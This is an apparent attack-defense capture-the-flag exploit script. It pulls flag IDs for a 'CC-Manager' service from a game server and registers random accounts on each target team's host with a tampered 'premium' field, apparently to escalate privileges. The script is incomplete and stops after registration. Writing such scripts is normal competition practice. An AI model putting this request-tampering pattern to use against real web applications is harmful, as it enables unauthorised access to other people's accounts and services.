#!/usr/bin/env python3
import requests
import json
import sys
import random
import string
from pwn import *
from hashlib import sha256, sha1
from Crypto.Util.number import getPrime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Util.number import inverse
import random

def generate(ln=32):
    return ''.join(random.choice(string.ascii_letters + string.digits) for i in range(ln))

addr = sys.argv[1]

team_id= addr.split(".")[2]

PORT = 5555
SERVICE = 'CC-Manager'

URL = 'http://' + addr + ':' + str(PORT)
FLAGID_URL = 'http://10.10.0.1:8081/flagIds?service={}&team={}'.format(SERVICE,team_id)
flag_ids = json.loads(requests.get(FLAGID_URL).text)
flag_ids = flag_ids[SERVICE][team_id]


for key, info in flag_ids.items():
    #Flag Ids Values:
    username = info['username']
    password = info['password']

    #If you need random shit:
    usr = generate()
    psw = generate()

    s = requests.Session()

    a = s.post(URL + '/register', data={'username': usr, 'password': psw, 'secret': 'suca', 'category': 'osint', 'premium': '1'})
    print(a.text, flush=True)